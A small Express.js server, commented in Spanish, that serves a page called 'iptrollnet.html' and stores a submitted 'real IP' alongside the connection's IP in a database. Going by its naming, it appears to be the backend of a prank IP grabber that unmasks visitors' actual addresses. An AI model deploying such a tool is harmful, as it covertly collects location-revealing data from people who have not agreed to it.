//imports
import express from 'express'
import {ip} from './database.js'
import mongoose from 'mongoose'

//declaraciones
const app= express()


//middeleware

app.use(express.json())

//rutas

app.get("/",function(req,res){res.sendFile("iptrollnet.html",{root:import.meta.dirname})})

app.post("/trollnet",async function(req,res){
    console.log("la ip real es:",req.body.ip_real)

    await ip.create({ip_real: req.body.ip_real, ip_registrada: req.ip})
    
    res.send("ok")


})
//escucha
app.listen(process.env.PORT || 3000,function(req,res){
    console.log("server activado")
})
